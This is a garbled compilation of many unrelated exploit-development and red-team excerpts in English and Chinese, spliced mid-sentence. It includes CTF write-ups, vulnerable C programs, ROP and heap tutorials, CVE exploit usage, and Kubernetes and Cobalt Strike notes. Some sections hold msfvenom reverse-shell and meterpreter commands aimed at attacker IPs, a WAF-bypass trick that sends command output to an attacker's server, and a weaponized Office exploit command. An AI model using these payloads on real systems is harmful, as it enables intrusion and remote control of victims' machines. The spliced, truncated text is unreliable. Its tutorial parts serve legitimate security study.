All CA Infrastructure Management monitoring agents prior to 9.20 are vulnerable to a buffer overflow vulnerability
within the nimcontroller when using the directory_list probe. Since the directory_list probe requires read privileges
the target host must also be vulnerable to CVE-2020-8010 to bypass ACL settings. Successful code execution will result
in a NT AUTHORITY\SYSTEM shell, even if exploitation fails the remote service will not crash. You should be able to
exploit the service an unlimited amount of times.

Owning Internet Printing - A Case Study in Modern Software Exploitation
Guest posted by Neel Mehta (nmehta@google.com) - June 19th, 2015
Abstract
Modern exploit mitigations draw attackers into a game of diminishing
marginal returns. With each additional mitigation added, a subset of
software bugs become unexploitable, and others become difficult to
exploit, requiring application or even bug-specific knowledge that
cannot be reused. The practical effect of exploit mitigations against
any given bug or class of bugs is the subject of gr[1]FuzzySec

Off-By-One Vulnerability (Heap Based)
Posted on [13]June 9, 2015June 28, 2015 by [14]sploitfun
Prerequisite:
1. [15]Off-By-One Vulnerability (Stack Based)
2. [16]Understanding glibc malloc
VM Setup: Fedora 20 (x86)
What is off-by-one bug?
As said in [17]this post, copying source string into destination buffer
could result in off-by-one when
1. Source string length is equal to destination buffer length.
When source string length is equal to dBuilding your own Shell-codes
We all know a typical BOF/Format string exploit, where we
inject a buggy program with a malicious payload making it
possible to take control over the execution of program and
run our injected payload(shell-codes).
Consider for example:
http://www.exploit-db.com/exploits/9608 this local exploit
Metasploit is the right source for picking up the suitable
payload for our exploits, from a list of many, and it even got
the capability to encode our shellcodes. But as it’s a freely
available exploit suit majority of the payloads get detected by
AV’s .So there comes the necessity of building custom shell
codes.
So this paper will be a guide to build your own shell codes
## 一  什么是Auto Exploit Generation

  Auto Exploit Generation (AEG)意为自动化利用代码生成,通常我们把得到的崩溃样本经过一系列的分析,根据崩溃点和执行环境上下文来推算该异常能否被利用和生成对应的利用代码(不是metasploit 里面的那种根据一个脚本和选择某种Shellcode 合并生成EXP 的方式).笔者把从Fuzzing 到Exploit 自动化的完整过程简述图解如下:

![img](picp4/1.png)

  整体步骤描述如下:

  1.我们通过Fuzzing 发现Crash 样本(漏洞挖掘过程)

  2.根据判断该样本触发的漏洞类型来判断是否能够执行代码(检测崩溃能否被利用)

  3.根据该漏洞类型对应的漏洞利用方式来计算是否有满足条件的解(利用求解过程)

  4.根据漏洞类型和满足求解条件的漏洞利用方法生成Exploit 代码

  在这四步骤中AEG 存在于第2-4 步,下面通过著名的AEG 实现库REX ([shellphish/rex](https://github.com/shellphish/rex/tree/master/rex/exploit/techniques))来一一分解AEG 的实现原理.



## 二  混合符号执行(Concolic Symbolic Execution)

  我们知道,符号执行不断模拟程序执行从而生成符号化的表达式,在我们需要进行约束求解的时候把这些符号化的表达式取出来进行求解.举个例子,在进行无输入的符号执行中,我们在执行到分支判断指令(TMOSDEF

I named this project `Mordor` because Hell's Gate / Halo's Gate / Tartarus' Gate remind me of the [Black Gate of Mordor](https://shadowofwar.fandom.com/wiki/Black_Gate) in [The Lord of the Rings](https://en.wikipedia.org/wiki/The_Lord_of_the_Rings_(film_series)) for some weird reason haha and the project needs a cool name so why not?

A gentle introduction to return-oriented programming
Hi,
As I have promised in [5]my last post I will start a series about
return-oriented programming. I start with a short introduction about
the topic. The introduction covers the origin of return-oriented
programming, describes what return-oriented programming is and ends
with a definition of return-oriented programming which I will use in
the futureLet's take a look at the source code...

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int unimportant_var0 = 0;
void not_important()
	{
	char buf0[100] = {0};
	read(STDIN_FILENO, buf0, sizeof(buf0) - 1);
	printf(buf0);

	if (unimportant_var0)
		{
			printf("Printf can do that? Oh right I enabled that. It claimed so many lives. Level Cleared\n");
		}
	}

int main()
{
	not_important();
}
```

We see that in order to pass the if then statement, we will need to change the value of the unimportant_var0 to something other than 0. We can see that there is a format string bug in the not_important function, which we can use to write to the unimportan_var0. We see that it uses print---

[7]When your Memory Allocator hides Security Bugs
Posted by [8]Hanno Böck on Wednesday, January 30. 2019
Memory Recently I shared some information about potential [9]memory
safety bugs in the Apache web server together with Craig Young. One
issue that came up in that context is the so-called pool allocator
Apache is using.
What is this [10]pool allocator? Apache’s APR library has a feature
where you can allocate a pool, which is a larger area of memory, and
then do memory allo#[1]GitHub

Exploi# Return 2 Libc attack
`ret2libc` attack is exploitable in case of following scenarios:
    * Memory is **non** executable.
    * Stack protection **disabled**.
    * Stack canaries **disabled**.
    * ASLR independent.

As the name suggests this attack, overflows the buffer and by overflowing the buffer it changes the return address to the address of the function in shared library(`libc`). The main thing to learn in this attack exploitation is that you need to understand the how the stack has to be tickled in case the return instruction has to mimic the actual CALL instruction. And this would require you to understand how the stack is laid during function call and to understand this you can###Level 1: **buffer_overflow**

Some thoughts about PE Injection
Sep 24, 2018
Injecting code into other process memory is not only limited to
shellcodes or DLLs.
PE Injection technique enables to inject and run a complete executable
module inside another process memory.
What is PE injection?
This technique is similar to [5]reflective DLL injection, since they do
not drop any files to the disk: reflective DLL injection works by
creating a DLL that maps itself into memory when executed, instead of
relying on the Window’s loader.
Like reflective DLL injection, this technique does not rely on
LoadLibrary function, but copy its malicious code into an existing open
process #[1]GitHub

Part 7: Return Oriented Programming
"Put your hands up! This is a ROPpery!!". So you have a cup of coffee,
you have your thinking-cap on and you want to take stack exploitation
to the next level. Well today we will be tackling ROP (Return Oriented
Programming). Not unlike the previous tutorial we will be crafting the
parameters to Windows API calls on the stack and then executing them.
Just like all the other tutorial part# get_flag Writeup

## Recon
The first step in approaching this challenge is to get the assembly for the program in question. In this case, the get_flag executable. To do this, we do: `objdump -d -M intel get_flag > get_flag.asm`. From this, we can see that we have the functions `winner`, `pass2`, and `pass1`. Therefore, these are the functions that we are going to place breakpoints on in gdb.

Doing some further recon by walking the code execution path from the `main` function will allow us to see how it calls the `pass1` function. If we then look at the `pass1` function, we can see that `pass2` is called within it. Therefore, we can determine that the `winner` function is never called, and#[1]Medium [2]alternate

各位师傅已放假，公众号更新速度自然也要跟得上。今天就是一个命令执行的小技巧。
我们在实战中经常会遇到命令执行漏洞，而由于现在各类waf横行，就会导致我们在执行一些命令时直接被waf拦截，比如执行cat
/etc/passwd的时候，直接被拦截了关键字，导致我们无法成功执行。类似于下图这种。
[]
然后直接被waf拦截住。这个时候如果目标出网的话，我们就可以使用下面的方法，进行突破。原理大体如下：
[]
即让目标主动访问我们的一个php的服务，并且将执行结果写入图片，然后打开图片得到我们的命令执行结果
下面是具体操作：
首先我们需要准备一个php文件，内容如下：
*
*
*
*
<?php    $file = date("dHis") . ".png";    move_uploaded_file($_FILES['image']['
tmp_name'], $file);?>
然后我们还需要一个脚本文件，来完成请求与命令执行操作：

The art of persistence is (and will be...) a matter of concern when
successfully exploitation is achieved. Sometimes is pretty tricky to
maintain access on certain environments, specially when it is not
possible to execute common vectors like creating or adding users to

[10]CORSAIR iCUE Driver Local Privilege Escalation (CVE-2020-8808)

​CORSAIR is considered one of the world’s leading providers for
high-performance PC peripherals and components. It offers a complete
range of products to equip gamers and content creators, including
keyboards, mice, headsets, capture cards, studio controllers, etc.
While researching the interface software that is CORSAIR iCUE v3.23.66
(the latest at the time of research), we’ve found that said software
installs a driver that will allow low privileged uirst let's see if it is a 32 bit or 64 bit elf.

Now that we know it is a 32 bit elf, let's take a look at the source code...

Black Hat USA 2010 Whitepaper

Abstract
Return-oriented programming (ROP), based on return-to-libc and borrowed-code-chunks
techniques, is one of the buzzing advanced exploitation techniques these days to bypass NX.
There are several practical works using ROP techniques for exploitations on Windows,
iPhone OS to bypass DEP and code signing. On most of modern Linux distributions, ASCII-
Armor address mapping (which maps libc addresses starting with NULL byte) and Address
Space Layout Randomization (ASLR) are enable by default to protect against return-to-libc /
ROP techniques.

CVE-2017-11882利用
发表于 2017-11-21 | 分类于 [10]奇技淫巧
最近这段时间CVE-2017-11882挺火的。关于这个漏洞可以看看这里:[11]隐藏17年的Office远程代码执行漏洞POC样本分析（CV
E-2017-11882）。
今天在twitter上看到有人共享了一个POC，[12]twitter地址，[13]poc地址，后来又看到有人共享了一个项目[14]CVE-2
017-11882，简单看了一下这个项目，通过对rtf文件的修改来实现命令执行的目的，但是有个缺陷就是，这个项目使用的是使用webdav的方式
来执行远程文件的，使用起来可能并不容易，所以就对此文件进行了简单的修改，具体项目地址如下：GIT：[15]CVE-2017-11882 。
使用方式很简单，如果要执行命令

python Command_CVE-2017-11882.py -c "cmd.exe /c calc.exe" -o test.doc

关于怎么进一步利用，可以参考之前写的[16]《windows命令执行漏洞不会玩？
看我！》，由于有长度的限制，这里可以采用mshta的方式来执行。构造的命令如下：

Microsoft Exchange – Privilege Escalation
by [28]# Kubernetes Exploit Hub

## Description
These are a collection of methods and tools I've found useful on pentesting Kubernetes Clusters. 

References to setup an AKS Cluster in Azure:
https://docs.microsoft.com/en-us/azure/aks/learn/quick-kubernetes-deploy-portal?tabs=azure-cli

### Microsoft Recon

If you have some Microsoft creds that have access to an AKS cluster

Login:
```
az login
```

Configure kubectl to connect to your Kubernetes cluster:
```
az aks get-credentials --resource-group myResourceGroup --name myAKSCluster
```

If you are on a administrative VM with WSL or linux box. You can and should loot the .kube directory!

### Discovery and Enumeration
**Discovery with nmap (Sample# 0x00 background

实验吧上面一个 pwn[^question] 拿来学习一下,[pwn5](../media/attach/pwn5).

# 0x01 recce

需要判断出在多少字节发生溢出.

```python
python -c 'import string; print(string.ascii_uppercase)'
```
利用上面 A-Z 变成输入来判断大约位于多少个字符处发生溢出, 在下面我用 A 字母代替溢出发生的地址.

```shell
Please Input Your Name:
ABCDEFGHIJKLMNOPQRSTAAAAYZ

In this problem, I smartened up. Nowhere in the binary will you find `"/bin/sh"`

```C
# include<stdio.h>
# include<string.h>
int main(int argc, char **argv) {
    putenv("PATH=");
    printf("I've broken up my system call!\n");
    printf("You think I've included what you need for this? You wish\n");
    char user_buf[64]= "";
    if (argc > 1) {
        strcpy(user_buf,argv[1]);
    }
    else {
        printf("usage: ./overflow [input]\n");
        return 0;
        }
    char buf1[10] = "/b";
    char buf2[8] = "in/";
    char buf3[5] = "date";
    strcat(buf2,buf3);
    strcat(buf1,buf2);
    system(buf1);
    printf("Aren't these string functions wo* Code:
```c
#include <stdio.h>
#include <stdlib.h>

void getName(){
	char name[15] = {0}; // !! Our buffer is only 15 characters... but: !!


	printf("What's your name? ");
	fgets(name, 100, stdin); // !! We are reading 100 characters despite only being able to store 15 characters !!
	printf("Cool name %s!", name);

}


void main(){
	getName();
}

void openShell(){
	system("/bin/sh");
}

```
* Decompiling in Ghidra, we get the following code for all the user defined functions:
```c
void getName(void){
  undefined8 local_17;
  undefined4 local_f;
  undefined2 local_b;
  undefined local_9;
  
  local_17 = 0;
  local_f = 0;
  local_b = 0;
  local_9 = 0;
  printf("What\'s your name? ");
  fgets# JS Hammer Time

# How to run

First 

```
./das-ssh.sh
preserve -native "-p expq -C glitch" -np 1 -t 3600
./das-node-ssh.sh {nodeID}
```

Then inside the node

```
./ff-it.sh
./frida-it.sh
./ff-restart.sh && ./flask-it.sh
```
# Details 

Please refer to the comments at the top of the `glitch()` function in `glitch.js` to run each of the below. 

### Allocation and Hammering 

This part of the project is unresolved due to the fact that, to the best of our knowledge, the allocation of hughe chunks is quite erroneous. Specially on node4, which is the most vulnerable, the number of allocated textures and the number of found textures in the KGSL do NOT match (after reading and filtering out the

Buffer overflow exploits have been regarded as one of the biggest
turn-offs of the OSCP student.
I am here to tell you that missing that 25 pointer is just ridiculous.
The 32 bit buffer overflow is one of the easiest boxes on the exam as
long as you follow this methodology.
Going through the section of the course PDF will absolutely put you to
sleep. I actually wound up skipping it bec#[1]Penetration Testing Lab » Feed [2]Penetration Testing Lab »

# Level 9

## Vulnerability

Off-by-one error allows buffer overflow

## Context

We find a binary with owner ```end``` and SUID.
```

[7]Windows 10 HAL’s Heap – Extinction of the "HalpInterruptController" Table
Exploitation Technique
Another kernel exploitation technique killed in Windows 10 Creators
Update
Posted on May 11, 2017  | Author: Nicolas Economou
I. Introduction
For many years, the HAL's heap in Windows has always been located at
the same static kernel address. On 32-bit versions of Windows it was
located at the address 0xffd00000 while on 64-bit versions of Windows
it could be found at the address 0xffffffff'ffd00000.
Since Windows 8, a table of function pointers called

## Execution

Generating a 64-bit meterpreter payload to be injected into the spoolsv.exe:

{% code title="attacker@local" %}
```csharp
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 -f dll > evil64.dll
```
{% endcode %}

Writing and compiling a simple C++ code that will register the monitor port:

{% code title="monitor.cpp" %}
```cpp
#include "stdafx.h"
#include "Windows.h"

int main() {	
	MONITOR_INFO_2 monitorInfo;
	TCHAR env[12] = TEXT("Windows x64");
	TCHAR name[12] = TEXT("evilMonitor");
	TCHAR dll[12] = TEXT("evil64.dll");
	monitorInfo.pName = name;

# OneFS Storage Administration (DELL EMC Isilon)

## Bruteforcing The Console?

We should be able to bruteforce the console by using my custom script [isilon-onefs-brute.py](https://github.com/wetw0rk/Exploit-Development/blob/master/Personal-Exploits/DELL%20EMC%20OneFS%20Storage%20Administration%208.1.2.0%20-%20Authenticated%20RCE/isilon-onefs-brute.py) (tested on 8.1.2.0). I have tested 1379 invalid passwords with one valid at the end and got a valid response... this means there is no timeouts in place at least for the defualt install.

WebKit CSS Type Confusion
Here is an interesting WebKit vulnerability I came across and reported
to Google, Apple and the WebKit.org developers.
Description: WebKit CSS Parser Type Confusion
Software Affected: Chrome 7/8, Safari 5.0.3, Epiphany 2.30.2,
WebKit-r72146 (others untested)
Severity: Medium
The severity of the vulnerability was marked Medium by the Chrome
developers because the bug can only result in an information leak. I
don't have a problem with that but I have some more thoughts on it at
the end of the post. But first the technical details.
The WebKit CSS parser internally# Build your own `system()`

Well, life is tough. Unlike in the first overflow exercise, there's no included function that you can call to get a shell. But let's try and get a shell anyways.

```C
# include<stdio.h>
# include<stdlib.h>
# include<string.h>

int main(int argc, char **argv) {
    if (argc>1) {
        gid_t gid = getegid();
        setresgid(gid, gid, gid);
        printf("Good thing you don't have /bin/sh");
        printf("\nGood luck getting a shell.\n");
        system("echo You Lose!\n");
        char buf[24];
        strcpy(buf,argv[1]);
    }
    return 0;
}
```

Now unlike the last problem, you might notice that there is no call to `system("/bin/sh")`. This means we're #[1]GitHub

In the previous section, we used a fuzzing script to find an
approximate bytes site where it crashed. Now, we need to find the
offset where the “EIP” was overwritten because that’s what we want to
control from this point on. For this purpose, we need to generate a
unique pattern using the Metasploit tool and

* Continuation of sorcery…!!
The comprehensive elimination of NX
Hey enthusiasts ✋✋,
I’m back again with my 4th part of the adventure Binary-Exploitation

Prerequisite:
1. [15]Classic Stack Based Buffer Overflow
VM Setup: Ubuntu 12.04 (x86)
In previous posts, we saw that attacker needs to know
* stack address (to jump to shellcode)
* libc base address (to successfully bypass NX bit)
inorder to exploit a vulnerable code. Hence to thwart attacker’s
action, security researchers came up with an exploit mitigation called
“ASLR”!!

Dell SupportAssist Driver - Local Privilege Escalation
May 17th, 2018
This post details a local privilege escalation (LPE) vulnerability I
found in Dell’s SupportAssist[0] tool. The bug is in a kernel driver
loaded by the tool, and is pretty similar to bugs found by ReWolf in
ntiolib.sys/winio.sys[1], and those found by others in
ASMMAP/ASMMAP64[2]. These bugs are pretty interesting because they can
be used to bypass driver signature enforcement (DSE) ad infinitum, or
at least until they’re no longer compatible with newer operating
systems.

[8][Kernel Exploitation] 4: Stack Buffer Overflow (SMEP Bypass)
Part 3 showed how exploitation is done for the stack buffer overflow
vulnerability on a Windows 7 x86/x64 machine. This part will target
Windows 10 x64, which has SMEP enabled by default on it.
Exploit code can be found [9]here.

ntoskrnl’s version: 10.0.16288.192

Instead of mouthfeeding you the problem, let’s run the [10]x64 exploit
on the Windows 10 machine and see w![alt text](https://i.imgur.com/bBQ9aKm.png)

ROP之return to dl-resolve
Posted by rk700 on August 9, 2015
我们都知道，ELF在执行时，许多函数的地址是lazy
binding的，即在第一次调用时才会解析其地址并填充至.got.plt。对于具体这一解析过程是如何完成的，之前并不怎么了解，只知道是在.pl
t中完成。其实之前Tiger有告诉我有一个名为[6]roputils的工具，利用的就是构造所需信息，直接解析得到system的地址进而ROP。
但直到最近才去研究其代码，搞明白这一技术，即return to dl-resolve，具体是怎么回事。
关于这一技术，在[7]phrack的某一期有具体介绍。在此，我们首先以32位为例，阐述其基本原理；之后则会分析64位环境下这一技术的一些注意点
。
32位环境下return to dl-resolve
ELF文件的.dynamic section里包含了ld.so用于运行时解析函数地址的信息。其内容示例如下:
$ readelf -d bof32
Dynamic section at offset 0x614 contains 24 entries:
Tag        Type                         Name/Value
0x00000001 (NEEDED)                     Shared library: [lib[1]0xabe.io

GoogleCTF - forced-puns
May 2, 2016 •
Here is a write-up for the forced-puns challenge of the first Google
CTF that was held that past weekend. The binary suffers from a buffer
overflow vulnerability on the heap that allows the overwrite of the top
chunk to perform the house of force heap exploitation technique. The
binary also leaks a heap address that leads to a leak of an address in
the .text segment and finally a libc address. With all that
information, it is possible to overwrite a pointer in the .got table
with the address of [6]system to execute a shell. It was fun to tackle
an ARM binary for the first time!

关于SSP的利用网上已经有很多的文章了，在16年左右三好学生师傅就已经对其有过详细的阐述，这里就不赘述了，或者可以来看snowming的文章(

Trimarc Research: Detecting Password Spraying with Security Event Auditing
Updated: Jun 17, 2021
A common method attackers leverage as well as many penetration testers
and Red Teamers is called "password spraying". Password spraying is
interesting because it’s automated password guessing. This autom

## [Description from ATT&CK](https://attack.mitre.org/techniques/T1566/001)
<blockquote>Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [User Execution](https:# NodeJS Red Team Cheat Sheet

For this tutorial, we're going to be fuzzing the URL parsing crate [rust-url][]. Our goal here is to find some input generated by the fuzzer such that, when passed to `Url::parse`, it causes some sort of panic or crash to happen.

To start, clone the rust-url repository and change directories into it:

```sh
git clone https://github.com/servo/rust-url.git
cd rust-url
```

Although we could fuzz the latest commit on `master`, we're going to checkout a specific revision that is known to have a parsing bug:

```sh
git checkout bfa167b4e0253642b6766a7aa74a99df60a94048

和大多数的横向移动手法一样，我们使用wmi事件进行横向移动时依旧要求我们有对目标机器的操作权限(或访问凭据)，该技术可以实现无文件的效果，这也
是该技术的优点之一。

In this lab, [Compatibility Administrator](https://www.microsoft.com/en-us/download/details.aspx?id=7352) will be abused to inject a malicious payload into putty.exe process, which will connect back to our attacking machine.

Generating malicious payload stored in a 32-bit DLL:

What is a Buffer Overflow?
Simply put, a buffer overflow occurs when inputted data occupies more
space in memory than allocated. The excess data may overwrite adjacent
memory locations, potentially altering the state of the application.
A Buffer overflow can be leveraged by an attacker with a goal of
modifying a computer’s memory to undermine or gain control of the

“IOHIDFamily once again.”
Introduction
This is the tale of a macOS-only vulnerability in IOHIDFamily that
yields kernel r/w and can be exploited by any unprivileged user.
IOHIDFamily has been notorious in the past for the many race conditions
it contained, which ultimately led to large parts of it being rewritten
to make use of command gates, as well as large parts being locked down
by means of entitlements. I was originally looking through its source
in the hope of finding a low-hanging fruit that would let me compromise
an iOS kernel, but what I didn’t know then is that some parts of

# 0x00 beginning

这个笔记是记录学习`bypass ASLR`过程的第一篇, 实验的主要来自`sploitfun`[^origin].

>what's ASLR?

ASLR(Address space layout randomization) 是利用随机化分布内存位置来提高`exp`执行门槛的技术, 随机化分布的对象有

* stack address
* heap address
* Shared library address
* kernel address

当地址被随机化过后`exp`需要定位到具体内存地址可能已经发生了变化. 比如之前笔记里面的`bypass nx`使用的`ret2libc`技术会因为`libc`基地址变化导致`system()`地址变化了而失效, 但是这个随机化并不是真正的随机无规律, 否则我很难想象计算机是怎么运行的 (那么也不会有这篇笔记).

在绝大多数的 Linux 发行版当中地址随机化是开启的, 在内核文档里面关于其选项的参数如下

[7]Windows 10 HAL’s Heap – Extinction of the "HalpInterruptController" Table
Exploitation Technique
Another kernel exploitation technique killed in Windows 10 Creators
Update
Posted on May 11, 2017  | Author: Nicolas Economou
I. Introduction
For many years, the HAL's heap in Windows has always been located at
the same static kernel address. On 32-bit versions of Windows it was
located at the address 0xffd00000 while on 64-bit versions of Windows
it could be found at the address 0xffffffff'ffd00000.
Since Windows 8, a table of function pointers called

## How 2 use:

1. Generate the _exploit.m3u_ file by running [`exploit.py`](https://raw.githubusercontent.com/NtRaiseHardError/Windows-Binary-Exploitation/master/Corelan/Corelan-Tutorials/RM-to-MP3# Examples

This page contains a full example of using Stratus Red Team.

## Example 1: Basic usage

## Authenticating to AWS

First, we'll authenticate to AWS using [aws-vault](https://github.com/99designs/aws-vault):

```bash
$ aws-vault exec sandbox-account
# If using an IAM user, use instead: aws-vault exec sandbox-account --no-session

$ aws sts get-caller-identity
{
    "UserId": "AIDA254BBSGPGUZJKQWRD",
    "Account": "012345678912",
    "Arn": "arn:aws:iam::012345678912:user/christophe"
}
```

Stratus Red Team should support any authentication option supported by the AWS Go SDK v2.
The general rule of thumb is: if you can run `aws sts get-caller-identity`, you can run Stratus Red Tea# Description

There exists an unauthenticated SEH based Buffer Overflow vulnerability in the HTTP server of Flexense SyncBreeze Enterprise v10.1.16. When sending a GET request with an excessive length, it is possible for a malicious user to overwrite the SEH record and execute a payload that would run under the Windows SYSTEM account.

Introduction
This blogpost will describe the concept of dynamic-link library (DLL)
search order hijacking and how it can be used for userland persistence
on Windows systems. This technique is mapped to MITRE ATT&CK under
[12]DLL Search Order Hijacking (T1038).
DLL hijacking is useful to an attacker for a myriad of reasons, but

## Vulnerability

printf() format string attack with %d

## Context

We find a binary with owner level5 and SUID.
```
level4@RainFall:~$ ls -l
-rwsr-s---+ 1 level5 users 5252 Mar  6  2016 level4
```
The binary seems to do the same thing as in previous levels, read from stdin, and print what is given.
```
level4@RainFall:~$ ./level4
oh hi!
oh hi!
```

## Solution

Investigating with gdb, we find fgets(), unfortunately protected against buffer overflow attack. But printf() may provide our vulnerability, similar to the last level.
```
level4@RainFall:~$ gdb -q level4
...
(gdb) disas main
...
   0x080484ad <+6>:	call   0x8048457 <n>
...
(gdb) disas n
...
...
   0x0804847a <+35>:	call # Level 8

## Vulnerability

Idiocy

## Context

We find a binary with owner level9 and SUID.
```
level8@RainFall:~$ ls -l
-rwsr-s---+ 1 level9 users 6057 Mar  6  2016 level8
```
When run accepts input on stdin and prints 2 null values.
```
level8@RainFall:~$ ./level8
(nil), (nil)
wait... what?
(nil), (nil)
```

## Solution

Investigating with gdb, we find the main reads stdin with fgets() accepting commands.

It calls system("/bin/sh") after several conditional jumps.
```
level8@RainFall:~$ gdb -q level8
...
(gdb) disas main
...
   0x080485ae <+74>:	call   0x8048440 <fgets@plt>

# Level bonus 2

## Vulnerability

strcat() buffer overflow

## Context

We find a binary with owner ```bonus3``` and SUID.
```
bonus2@RainFall:~$ ls -l
-rwsr-s---+ 1 bonus3 users 5664 Mar  6  2016 bonus2
```
When run with 0 or 1 arguments, it does nothing. Run with 2 arguments it prints "Hello " + first argument.
```
bonus2@RainFall:~$ ./bonus2
bonus2@RainFall:~$ ./bonus2 wait
bonus2@RainFall:~$ ./bonus2 wait what?
Hello wait
```

## Solution

In summary, the program expects to be given a username, then prints "Hello <username>".

Investigating with gdb we find ```main()``` initializes a 72 byte buffer, copies 40 bytes from argv[1], then 32 bytes from argv[2]. It then checks the language enTECHNICAL

This [issue](https://github.com/n132/Libc-GOT-Hijacking/issues/1) mentions the problem that glibc 2.36 and later versions cannot be exploited, due to the GOT (Global Offset Table) headers in libc no longer being writable. However, we found that .got.plt in libc is  still writable, hence we have the following method (verified on glibc 2.36 / 2.37 / 2.38).

# Core Idea

Perform ROP on GOT

# Steps

* Trigger puts, which is in the target function in binary
* The puts function will call `strlen` function, triggering a got entry slot on .got.plt (Assuming the index of `strlen` is 0x10 on .got.plt)

Exploiting v8: *CTF 2019 oob-v8
Posted on December 13, 2019
Introduction
I’ve recently been researching browsers, specifically JavaScript Engine
exploitation in Chrome’s v8. Being a CTF player myself, I thought doing
a fairly recent CTF challenge might help me wrap my head around some of
the exploitation techniques that are widely used provided a
vulnerability does exist.
I picked the challenge oob-v8 from *CTF 2019, because it seems as
though all the writeups for it are fairly incomplete. They either
assume a bunch of prerequisite knowledge, or just don’t explain things

PEzor v2 — New Output Formats and Cobalt Strike Integration
The execute-assembly capability of [2]Cobalt Strike’s beacon lets
operators execute .NET assemblies without touching the disk and it
deeply influenced the recent offensive developments by pushing the
community to move towards .NET. But wouldn’t be nice if we could
[3]execute arbitrary executables in-memory with the same ease? Let’s
find out how we can achieve that with [4]PEzor!

Abstract—Signal handling has been an integral part of
UNIX systems since the earliest implementation in the 1970s.
Nowadays, we find signals in all common flavors of UNIX
systems, including BSD, Linux, Solaris, Android, and Mac OS.
While each flavor handles signals in slightly different ways, the
implementations are very similar. In this paper, we show that
signal handling can be used as an attack method in exploits
and backdoors. The problem has been a part of UNIX from
the beginning, and now that advanced security measures like

A Red Teamer's guide to pivoting
Mar 23, 2017
Penetration testers often traverse logical network boundaries in order
to gain access to client’s critical infrastracture. Common scenarios
include developing the attack into the internal network after
successful perimeter breach or gaining access to initialy unroutable
network segments after compromising hosts inside the organization.
Pivoting is a set of techniques used during red team/pentest
engagements which make use of attacker-controlled hosts as logical
network hops with the aim of amplifying network visibility. In this
post I’ll cover common pivoting techniques a## how2heap

In this paper I will present an elegant technique (it’s my opinion,
indeed) to get shell access to a vulnerable remote machine. It is not
my own technique but I found it very interesting. The focus of this
paper is on this technique and not in the way to exploit the
vulnerability.
Setting your environment
So, in order to focus on the remote shell code and not on how to
circumvent ASLR, non-executable stacks and so on (that1. Fuzz it and have it crash with all A's

2. Take control of EIP and one other register (ESP, EAX, etc.)

    A. Use `pattern_create $buffersize` and `pattern_offset $register_value`

3. Find badchars

    A. Use `!mona bytearray -b "\x00"` or use own Python algo (even better)

4. Generate the shellcode and insert it into the script
    
    A. Remember to generate the shellcode excluding the bad chars! Example:
    ```bash
    msfvenom -f python -b '\x00' -p windows/shell_reverse_tcp LHOST=192.168.40.47 LPORT=443 \
    EXITFUNC=thread > revshellwin.py`

今天，群里的大佬分享出了CobaltStrike4.1（感谢师傅分享），于是拿来尝尝鲜。关于cs4.1新出的功能，在很早之前，公众号已发过相关
文章，在此不再赘述，具体更新信息，可去(https://www.cobaltstrike.com/releasenotes.txt)查看。
本次更新的东西没有太多需要理解的地方，更多是在4.0的基础上修复了一些Bug，对一些细节进行了调整，比如删除了在新进程中生成x86负载的x64
dll的选项、修复了getsystem的一些逻辑错误、添加smartinject功能、Mimikatz 更新至2.2.0 20200519等
不过对于我来说，更令我喜欢的还是其BOF功能，关于这个功能，简单来说就是beacon提供了一个内部的API，你可以通过这个API去开发一些自定
义的模块，多用于横向移动，好处就是体积小，不过需要在本地先调试好，不然容易掉权限。官方链接如下：https://www.cobaltstrik

# Level 5

## Vulnerability

Global Offset Table Exploit + printf string vulnerability

## Context

```
level5@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 level6 users 5385 Mar  6  2016 level5
level5@RainFall:~$ ./level5
hello
hello
```
We have a binary that prints input from the stdin.

## Solution

Let's take a look at the binary in gdb. <br/>
We can see here that ```level5``` makes a call to ```main()```, which makes a call to a function ```n()```. <br/>
There is also a function ```o()``` which is not called. 
```
(gdb) disas main
Dump of assembler code for function main:
   0x08048504 <+0>:	push   %ebp
   0x08048505 <+1>:	mov    %esp,%ebp

这个笔记记录学习 [^origin] 如何利用`GOT overwrite`与`GOT dereference`绕过共享库随机化, 不同于此前的`overwrite plt`, 在这里攻击者可不依赖的`plt`的存在与否.

### what is GOT overwrite?

>本方法, 攻击者可用其他`libc`函数的地址来覆写`libc`中另一函数的`GOT`入口. 例如`GOT`包含`getuid`函数地址 (在第一次调用过后, 动态绑定), 但其值可被覆写为`execve`函数地址, 因在共享库中函数的相对偏移量是常数, 因此若将同一共享库中两个不同函数偏移量的值相加回原`GOT`入口, 本例子中就可获得`execve`函数地址, 而后可期望调用`getuid`时变为`execve`!
>
    offset_diff = execve_addr - getuid_addr
    GOT[getuid] = GOT[getuid] + offset_diff

### What is GOT dereference?

>本方法与`GOT overwrite`相似, 但这代替覆写入`GOT`入口的实际函数的值是复制到寄存器后加上面偏移量到*寄存器*内的值, 因此寄存器存放`libc`中某函数地址. 例如`GOT[getuid]`包含`getuid`函数地址, 把它复制到寄存器内, 后将两个函数的偏移量相加到寄存器里面, 这样 call 寄存器就变成调用另一函数了.

Fun With Info-Leaks
This article is about information leaks in form of memory disclosures
created in Internet Explorer 10 32-bit on Windows 7 64-bit. They are
used to bypass full ASLR/DEP to gain remote code execution. While the
software containing the bug might not be that popular, it’s quite nice
what can be done with the bug.
Reading this article requires some familiarity with [8]WinDbg, [9]heap
[10]spray , and [11]info-leaks.
Hope you enjoy it.

Exploiting 64-bit Linux like a boss
Back in November 2012, a [5]Chrome Releases blog post mysteriously
stated: "Congratulations to Pinkie Pie for completing challenge: 64-bit
exploit".
Chrome patches and autoupdates bugs pretty fast but this is a WebKit
bug and not every consumer of WebKit patches bugs particularly quickly.
So I've waited a few months to release a full breakdown of the exploit.
The exploit is notable because it is against 64-bit Linux. 64-bit
exploits are generally harder than 32-bit exploits for various reasons,
including the fact th#[1]j00ru//vx tech blog » Feed [2]j00ru//vx tech blog » Comments Feed

利用 PHP-FPM 做内存马的方法
[3]wofeiwo 2022-08-24 10:03:00
[4]后门 [5]PHP安全 [6]Web安全
__________________________________________________________________
[7]前言
Java 内存马固然是极好的，可我略微瞟了一眼[8]PHP 的占有率，虽然从我上次关注 PHP 10年都过去了，PHP
却仍然是最为主流的服务端 Web 语言。所以，为什么没人做 PHP 的内存马研究呢？
